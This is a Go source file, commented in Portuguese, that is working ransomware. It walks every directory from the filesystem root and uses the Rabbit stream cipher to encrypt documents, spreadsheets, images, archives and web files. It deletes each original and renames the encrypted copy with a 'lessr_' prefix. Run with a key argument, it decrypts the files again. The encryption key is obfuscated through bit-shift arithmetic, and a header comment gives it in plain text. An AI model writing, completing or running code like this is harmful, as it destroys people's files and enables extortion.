package main

// key: ./obfuse -s XLdoclqeDDDcxo12

import (
	"snix.ir/rabbitio"
	"unsafe"
	"fmt"
	"io/ioutil"
	"path/filepath"
	"os"
	"strings"
	"io"
	_ "embed"
	"math/rand"
	"strconv"
	"sync"
	"time"
)

const (
	EAX = uint8(unsafe.Sizeof(true))
)

func CheckFileSize(path string) (int64) {
	fileInfo, _ := os.Stat(path)
	return fileInfo.Size()
}


func createTemporaryFile(filename string, fullPath string) (string, string) {
	rand.Seed(time.Now().UnixNano())
	randomNumber := rand.Intn(1000000)
	fileName := strconv.Itoa(randomNumber) + "_" + filename
	tmpFile, err := ioutil.TempFile("", fileName)
	if err != nil {
		return "", ""
	}
	temporaryFileName := tmpFile.Name()
	defer tmpFile.Close()
	return temporaryFileName, fileName
}

func encryptFile(dir string, halfSize int64){


	fileSize := CheckFileSize(dir)

	parts := strings.Split(dir, "\\")

    lastPart := parts[len(parts)-1]


	parts2 := strings.Split(dir, "\\")
    basePath_split := parts2[:len(parts2)-1]

	basePath := strings.Join(basePath_split, "\\")

	// cria arquivo temporario
	tempFilePath, _ := createTemporaryFile(lastPart, basePath)

	// le dados do arquivo original e salva em uma variavel

	buffer2 := make([]byte, fileSize)
	buffer2, err222 := ioutil.ReadFile(dir)
	if err222 != nil{
		return
	}

	// abre arquivo temporario criado
	file2, err := os.OpenFile(tempFilePath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil{
		return
	}

	// Escreva o conteúdo do arquivo original do arquivo temporario
	_, err3 := file2.Write(buffer2)
	if err3 != nil{
		return
	}
	file2.Close()
	

	var strr []byte
	strr = append(strr, ((EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX)
	strr = append(strr, ((EAX<<EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX)
	strr = append(strr, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX)
	strr = append(strr, (((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX^EAX))
	strr = append(strr, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX|EAX)<<EAX|EAX))
	strr = append(strr, (((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX)
	strr = append(strr, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX|EAX))
	strr = append(strr, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX|EAX))
	strr = append(strr, (EAX<<EAX<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX)
	strr = append(strr, (EAX<<EAX<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX)
	strr = append(strr, (EAX<<EAX<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX)
	strr = append(strr, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX|EAX)<<EAX|EAX))
	strr = append(strr, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX)
	strr = append(strr, (((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX^EAX))
	strr = append(strr, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX|EAX))
	strr = append(strr, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX)

	key := []byte(strr)
	ivx := []byte("2x920d91")
    ptx := buffer2

	str, err := rabbitio.NewCipher(key, ivx)
	if err != nil {
		panic(err)
	}

	cpt := make([]byte, len(ptx))
	str.XORKeyStream(cpt, []byte(ptx))


	// Abre o arquivo temporario para escrita
	fileWrite, er2r := os.OpenFile(tempFilePath, os.O_RDWR | os.O_TRUNC, 0644)
	if er2r != nil {
		return
	}
	_, err = fileWrite.Write(cpt)
	if err != nil {
		return
	}

	fileWrite.Close()

	// Remove o arquivo original após o processamento
	err = os.Remove(dir)
	if err != nil {
		return
	}

	// move arquivo temporario para diretorio do arquivo original apagado
	destPath := basePath + "\\" + "lessr_"+lastPart
	err2 := os.Rename(tempFilePath, destPath)
	if err2 != nil {
		return
	}


}

func decryptFile(dir string, totalSize int64, key1 string){
	buffer := make([]byte, totalSize)
	buffer, err := ioutil.ReadFile(dir) // Substitua pelo caminho do seu arquivo
	if err != nil {
		return
	}

	key := []byte(key1)
	ivx := []byte("2x920d91")
	str, err := rabbitio.NewCipher(key, ivx)


	// decrypt cipher text and print orginal text
	str.XORKeyStream(buffer, buffer)

	original_filename := strings.Replace(dir, "lessr_", "", -1)
	os.Rename(dir, original_filename)

	fileWrite, er2r := os.OpenFile(original_filename, os.O_RDWR, 0644)
	if er2r != nil {
		return
	}
	_, err = fileWrite.Seek(0, io.SeekStart)
	if err != nil {
		return
	}
	_, err = fileWrite.Write(buffer)
	if err != nil {
		return
	}


}

func listarArquivosEDiretorios(dir string, wg *sync.WaitGroup) {
	absPath, err := filepath.Abs(dir)
	if err != nil {
		return
	}
	validExtensions := []string{".pdf", ".docx", ".png", ".jpeg", ".xlsx", ".doc", ".zip", ".pptx", ".ods", ".xls", ".html", ".css", ".js"}

	err = filepath.Walk(absPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		// Lança uma goroutine para cada arquivo ou diretório encontrado
		wg.Add(1)
		go func(path string, info os.FileInfo) {
			defer wg.Done()

			if !info.IsDir() {
				for _, ext := range validExtensions {
					if strings.HasSuffix(strings.ToLower(info.Name()), ext) {
						go func(){
							var fileSize = CheckFileSize(path)
							if len(os.Args) < 2 {
								encryptFile(path, fileSize)
							} else{
								arg := os.Args[1]
								decryptFile(path, fileSize, arg)
							}
						}()

					}
				}
			}
		}(path, info)

		return nil
	})
}

func copyFile(src, dst string) error {
	// Abre o arquivo de origem
	sourceFile, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("erro ao abrir arquivo de origem: %v", err)
	}
	defer sourceFile.Close()

	// Cria ou abre o arquivo de destino
	destinationFile, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("erro ao criar arquivo de destino: %v", err)
	}
	defer destinationFile.Close()

	// Copia o conteúdo do arquivo de origem para o destino
	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return fmt.Errorf("erro ao copiar conteúdo do arquivo: %v", err)
	}

	return nil
}

func main() {
	var initialFolderList []string

	files, err := ioutil.ReadDir("/")
	if err != nil {
		return
	}
		// Adiciona as pastas à lista
	for _, file := range files {
		if file.IsDir() {
			initialFolderList = append(initialFolderList, file.Name())
		}
	}

	var wg sync.WaitGroup

	for _, item := range initialFolderList {
		wg.Add(1)
		go func(item string) {
			defer wg.Done()
			// Cria o caminho absoluto completo para cada diretório
			absPath := filepath.Join("/", item)
			listarArquivosEDiretorios(absPath, &wg)

		}(item)
	}
	wg.Wait()

}
